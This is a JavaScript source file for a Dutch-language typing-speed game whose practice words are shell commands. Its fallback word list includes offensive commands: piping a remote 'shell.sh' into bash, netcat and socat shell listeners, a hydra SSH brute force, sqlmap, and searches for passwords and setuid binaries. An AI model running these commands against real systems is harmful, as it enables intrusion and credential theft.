(() => {
  const DURATION = 60;
  const displayEl = document.getElementById('display');
  const inputEl = document.getElementById('input');
  const wpmEl = document.getElementById('wpm');
  const accEl = document.getElementById('acc');
  const timeEl = document.getElementById('time');
  const resetBtn = document.getElementById('reset');
  const startHint = document.getElementById('start-hint');
  const liveRegion = document.getElementById('live-region');
  const capsWarning = document.getElementById('caps-warning');
  const keyboardKeys = Array.from(document.querySelectorAll('.keyboard span'));
  const codeToKeyEl = new Map();
  const keyToKeyEl = new Map();

  keyboardKeys.forEach((el) => {
    const { key, code } = el.dataset;
    if (code) {
      codeToKeyEl.set(code, el);
    }
    if (key) {
      const normalized = key.length === 1 ? key.toLowerCase() : key;
      if (!keyToKeyEl.has(normalized)) {
        keyToKeyEl.set(normalized, el);
      }
    }
  });

  let capsActive = false;

  const fallbackWords = [
    'ls',
    'pwd',
    'cd',
    'clear',
    'whoami',
    'id',
    'hostname',
    'uname -a',
    'date',
    'uptime',
    'ifconfig',
    'ip a',
    'ip route',
    'ping -c 1 8.8.8.8',
    'traceroute 8.8.8.8',
    'netstat -tulpn',
    'ss -tulwn',
    'ps aux',
    'top',
    'htop',
    'journalctl -xe',
    'dmesg | tail',
    'tail -f /var/log/auth.log',
    'grep -R "password" /etc',
    'find / -perm -4000',
    'locate shadow',
    'chmod +x exploit.sh',
    'chown root:root /bin/bash',
    'ln -s /bin/sh /tmp/sh',
    'tar -czvf backup.tar.gz /var/www',
    'gzip -d logs.gz',
    'scp file.txt user@10.0.0.5:/tmp/',
    'ssh user@10.0.0.5',
    'rsync -avz . user@host:/srv/',
    'curl -s http://10.10.10.10',
    'wget http://example.com/shell.sh',
    'python3 -m http.server 8000',
    'nc -lvnp 4444',
    'rlwrap nc -lvnp 4444',
    'socat TCP-LISTEN:4444,reuseaddr,fork TCP:10.0.0.1:4444',
    'ssh -L 8080:localhost:80 user@10.0.0.5',
    'proxychains nmap -sT 10.10.10.10',
    'nmap -sC -sV 10.10.10.10',
    'sudo nmap 10.10.15.100 -sV -sC -p- -v -Pn',
    'hydra -l admin -P rockyou.txt 10.0.0.5 ssh',
    'gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt',
    'feroxbuster -u http://target -w wordlist.txt',
    'sqlmap -u "http://target/id=1" --batch',
    'msfconsole -q -x "use exploit/multi/handler"',
    'wget -qO- http://10.10.10.10/shell.sh | bash'
  ];

  const state = {
    words: [],
    queue: [],
    timerId: null,
    startedAt: null,
    elapsed: 0,
    remaining: DURATION,
    started: false,
    finished: false,
    totalTyped: 0,
    correctChars: 0,
    currentWord: '',
    lastInputLength: 0
  };

  const activeKeyEls = new Set();
  const startComboKeys = new Set();

  function setCapsState(active) {
    capsActive = Boolean(active);
    if (capsWarning) {
      capsWarning.hidden = !capsActive;
    }
  }

  function findKeyElement(event) {
    if (event.code && codeToKeyEl.has(event.code)) {
      return codeToKeyEl.get(event.code);
    }
    if (typeof event.key === 'string') {
      const normalized = event.key.length === 1 ? event.key.toLowerCase() : event.key;
      if (keyToKeyEl.has(normalized)) {
        return keyToKeyEl.get(normalized);
      }
    }
    return null;
  }

  function setKeyHighlight(event, active) {
    const el = findKeyElement(event);
    if (!el) {
      return;
    }
    if (active) {
      el.classList.add('active');
      activeKeyEls.add(el);
    } else {
      el.classList.remove('active');
      activeKeyEls.delete(el);
    }
  }

  function clearKeyHighlights() {
    activeKeyEls.forEach((el) => {
      el.classList.remove('active');
    });
    activeKeyEls.clear();
  }

  // Schudt de lijst zodat woorden pas herhaald worden na een volledige ronde.
  function shuffle(list) {
    const arr = [...list];
    for (let i = arr.length - 1; i > 0; i -= 1) {
      const j = Math.floor(Math.random() * (i + 1));
      [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
  }

  function escapeHTML(str) {
    return str.replace(/[&<>"']/g, (char) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    })[char]);
  }

  function announce(message) {
    liveRegion.textContent = '';
    window.setTimeout(() => {
      liveRegion.textContent = message;
    }, 30);
  }

  function updateStartHint(mode) {
    if (!startHint) {
      return;
    }

    if (mode === 'running') {
      startHint.textContent = 'Je bent live — blijf typen!';
      return;
    }

    if (mode === 'finished') {
      startHint.innerHTML = 'Nog een ronde? Druk opnieuw op <kbd>F</kbd> en <kbd>J</kbd>.';
      return;
    }

    startHint.innerHTML = 'Start door tegelijk op <kbd>F</kbd> en <kbd>J</kbd> te drukken.';
  }

  function clearStartCombo() {
    startComboKeys.clear();
  }

  function renderWord(typed = '') {
    if (!state.currentWord) {
      displayEl.innerHTML = '&nbsp;';
      return;
    }

    const word = state.currentWord;
    let prefixLength = 0;

    while (prefixLength < typed.length && prefixLength < word.length && typed[prefixLength] === word[prefixLength]) {
      prefixLength += 1;
    }

    const mistakePresent = typed.length > prefixLength;
    const nextChar = word[prefixLength] ?? '';
    const restStart = mistakePresent && nextChar ? prefixLength + 1 : prefixLength;

    let html = '';

    if (prefixLength) {
      html += `<span class="ok">${escapeHTML(word.slice(0, prefixLength))}</span>`;
    }

    if (mistakePresent && nextChar) {
      html += `<span class="err">${escapeHTML(nextChar)}</span>`;
    } else if (mistakePresent && !nextChar) {
      html += '<span class="err">_</span>';
    }

    if (word.length > restStart) {
      html += escapeHTML(word.slice(restStart));
    }

    displayEl.innerHTML = html || escapeHTML(word);
  }

  function computeElapsed() {
    if (!state.startedAt) {
      return state.elapsed;
    }
    return state.elapsed + (performance.now() - state.startedAt) / 1000;
  }

  function updateStats() {
    const elapsedSeconds = computeElapsed();
    const minutes = elapsedSeconds > 0 ? elapsedSeconds / 60 : 0;
    const rawWpm = minutes > 0 ? (state.correctChars / 5) / minutes : 0;
    const wpm = Number.isFinite(rawWpm) ? Math.round(rawWpm) : 0;
    const accuracy = state.totalTyped > 0 ? Math.round((state.correctChars / state.totalTyped) * 100) : 100;

    wpmEl.textContent = String(Math.max(0, wpm));
    accEl.textContent = `${Math.max(0, Math.min(accuracy, 100))}%`;
  }

  function updateTime() {
    timeEl.textContent = `${Math.max(0, state.remaining)}s`;
  }

  function startTimer() {
    if (state.timerId) {
      return;
    }

    if (!state.startedAt) {
      state.startedAt = performance.now();
    }

    const step = () => {
      if (!state.started) {
        return;
      }

      const elapsedSeconds = computeElapsed();
      const newRemaining = Math.max(DURATION - Math.floor(elapsedSeconds), 0);

      if (newRemaining !== state.remaining) {
        state.remaining = newRemaining;
        updateTime();
      }

      updateStats();

      if (newRemaining <= 0) {
        endGame();
        return;
      }

      state.timerId = window.requestAnimationFrame(step);
    };

    state.timerId = window.requestAnimationFrame(step);
  }

  function stopTimer(persistElapsed = true) {
    if (state.timerId) {
      window.cancelAnimationFrame(state.timerId);
      state.timerId = null;
    }

    if (persistElapsed && state.startedAt) {
      state.elapsed += (performance.now() - state.startedAt) / 1000;
    }

    state.startedAt = null;
  }

  function pauseTimer() {
    if (!state.started) {
      return;
    }
    stopTimer(true);
  }

  function resumeTimer() {
    if (!state.started || state.timerId) {
      return;
    }
    startTimer();
  }

  function refreshQueue() {
    state.queue = shuffle(state.words);
  }

  function nextWord() {
    if (!state.words.length) {
      return;
    }
    if (state.queue.length === 0) {
      refreshQueue();
    }
    state.currentWord = state.queue.shift();
    renderWord('');
    announce(`Nieuw woord: ${state.currentWord}`);
  }

  function startGame() {
    if (!state.words.length || state.started) {
      return;
    }

    state.started = true;
    state.finished = false;
    state.elapsed = 0;
    state.remaining = DURATION;
    state.totalTyped = 0;
    state.correctChars = 0;
    state.currentWord = '';
    state.lastInputLength = 0;
    refreshQueue();

    inputEl.value = '';
    inputEl.disabled = false;
    inputEl.classList.remove('input-error');
    inputEl.focus();

    resetBtn.disabled = false;

    updateTime();
    updateStats();
    nextWord();
    startTimer();
    updateStartHint('running');
    clearStartCombo();
  }

  function endGame() {
    if (!state.started) {
      return;
    }

    stopTimer(true);
    state.started = false;
    state.finished = true;
    state.remaining = 0;
    updateTime();
    updateStats();

    inputEl.disabled = true;
    inputEl.blur();
    inputEl.classList.remove('input-error');

    clearKeyHighlights();
    updateStartHint('finished');
    clearStartCombo();
    announce(`Tijd is op. ${wpmEl.textContent} woorden per minuut, ${accEl.textContent} nauwkeurigheid. Druk opnieuw op F en J voor een rematch.`);
  }

  function resetGame() {
    stopTimer(false);
    state.started = false;
    state.finished = false;
    state.elapsed = 0;
    state.remaining = DURATION;
    state.totalTyped = 0;
    state.correctChars = 0;
    state.currentWord = '';
    state.queue = [];
    state.lastInputLength = 0;

    setCapsState(false);
    clearKeyHighlights();

    inputEl.value = '';
    inputEl.disabled = true;
    inputEl.classList.remove('input-error');

    resetBtn.disabled = true;

    displayEl.innerHTML = '&nbsp;';
    updateTime();
    updateStats();
    updateStartHint('ready');
    clearStartCombo();
    announce('Game gereset. Druk tegelijk op F en J om te starten.');
  }

  function handleInput(event) {
    if (!state.started) {
      event.target.value = '';
      return;
    }

    const raw = event.target.value;
    const value = raw.replace(/^\s+/, '');
    if (value !== raw) {
      event.target.value = value;
    }

    const diff = Math.max(value.length - state.lastInputLength, 0);
    if (diff > 0) {
      state.totalTyped += diff;
    }
    state.lastInputLength = value.length;

    const word = state.currentWord;
    const typed = value.replace(/\s+$/, '');
    const isCorrectPrefix = word.startsWith(typed);
    inputEl.classList.toggle('input-error', value.length > 0 && !isCorrectPrefix);

    renderWord(typed);
    updateStats();

    const completed = typed === word && value.length >= word.length;

    if (completed) {
      state.correctChars += word.length;
      state.lastInputLength = 0;
      event.target.value = '';
      inputEl.classList.remove('input-error');
      nextWord();
    }
  }

  function handleKeydown(event) {
    setKeyHighlight(event, true);
    if (typeof event.getModifierState === 'function') {
      setCapsState(event.getModifierState('CapsLock'));
    }

    const key = typeof event.key === 'string' ? event.key.toLowerCase() : '';
    if (key === 'f' || key === 'j') {
      startComboKeys.add(key);
      if (!state.started && startComboKeys.has('f') && startComboKeys.has('j')) {
        event.preventDefault();
        startGame();
      }
    }

    if (event.key === 'Enter' && state.finished) {
      event.preventDefault();
      startGame();
    }
  }

  function handleKeyup(event) {
    setKeyHighlight(event, false);
    if (typeof event.getModifierState === 'function') {
      setCapsState(event.getModifierState('CapsLock'));
    }

    const key = typeof event.key === 'string' ? event.key.toLowerCase() : '';
    if (key === 'f' || key === 'j') {
      startComboKeys.delete(key);
    }
  }

  async function loadWords() {
    try {
      const res = await fetch('data/words.txt', { cache: 'no-store' });
      if (!res.ok) {
        throw new Error('Kan woordenlijst niet laden');
      }
      const text = await res.text();
      const list = text
        .split(/\r?\n/)
        .map((word) => word.trim())
        .filter(Boolean);
      if (!list.length) {
        throw new Error('Woordenlijst leeg');
      }
      state.words = Array.from(new Set(list));
    } catch (error) {
      state.words = fallbackWords;
    }
  }

  resetBtn.addEventListener('click', () => {
    resetGame();
  });

  inputEl.addEventListener('input', handleInput);
  document.addEventListener('keydown', handleKeydown);
  document.addEventListener('keyup', handleKeyup);

  window.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') {
      pauseTimer();
    } else if (document.visibilityState === 'visible') {
      resumeTimer();
    }
  });

  loadWords().then(() => {
    if (!state.words.length) {
      state.words = fallbackWords;
    }
    resetGame();
  });
})();
